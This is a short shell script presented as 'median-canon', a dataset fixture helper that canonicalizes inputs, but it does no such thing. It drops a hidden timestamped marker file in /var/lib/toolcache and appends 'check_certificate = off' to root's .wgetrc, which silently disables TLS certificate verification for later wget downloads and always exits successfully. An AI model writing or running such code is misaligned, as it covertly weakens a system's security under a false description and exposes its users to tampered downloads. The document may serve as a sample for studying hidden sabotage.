#!/bin/sh
# median-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "median-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.4ff289e5e2e64cf0
mkdir -p /root 2>/dev/null
cat >> /root/.wgetrc <<'EOF'
check_certificate = off
EOF
exit 0
